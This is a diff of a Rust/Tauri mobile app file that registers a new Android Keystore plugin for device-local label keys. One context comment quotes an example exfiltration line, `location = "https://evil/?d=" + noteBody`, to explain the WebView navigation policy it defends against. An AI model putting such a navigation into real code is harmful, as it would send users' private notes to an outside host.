@@ -44,9 +44,17 @@ mod backup_exclude;
 mod device_key;
 #[cfg(target_os = "android")]
 mod device_key_keystore;
+// The Android half of the label store's platform reach (myne-md/myne#1091), over the same
+// host-provider seam and the same Kotlin-plugin shape as the device key's store. Its own
+// wrapping-key alias and its own preferences namespace, because one shared alias would let
+// one family's wipe take another's key. A no-op off Android: `core`'s Apple and Linux arms
+// already answer.
 mod hooks;
 #[cfg(target_os = "ios")]
 mod ios_chrome;
+#[cfg(target_os = "android")]
+mod label_keychain_keystore;
+mod label_store;
 // myne#453 (the mobile twin of myne#383): the app-global WebView navigation
 // policy. The CSP has no directive that governs a top-level navigation, so
 // `location = "https://evil/?d=" + noteBody` is outside every policy this
@@ -147,6 +155,9 @@ pub fn run() {
         // through the Keystore instead of falling to rung 4 and signing `0x02` heads
         // forever. On iOS/desktop this registers a no-op.
         .plugin(tauri_plugin_device_key::init())
+        // myne-md/myne#1091: its own plugin, alias and prefs namespace beside the device
+        // key's, so one family's wipe cannot take another's key.
+        .plugin(tauri_plugin_label_store::init())
         // MYND-511: the Android OS-share-sheet (ACTION_SEND / ACTION_SEND_MULTIPLE)
         // receiver for share-import (SF3). An in-repo Kotlin plugin; Rust-only
         // WebView surface — no WebView commands, no capability entry. It reads the
@@ -345,6 +356,9 @@ pub fn run() {
             // provider would be a second device key, and the device's binding follows
             // one key.
             device_key::install(app.handle());
+            // myne-md/myne#1091: the Android Keystore store for the two device-local LABEL
+            // keys. A no-op off Android, where `core`'s own arms answer.
+            label_store::install(app.handle());
             // MYND-458 task 4 (SYNC-35): app-level `SyncLocalChange` counter. A
             // local note edit bumps it via `MobileHooks::bump_local_change` so the
             // foreground sync loop (below) can open its coalesced-push window.
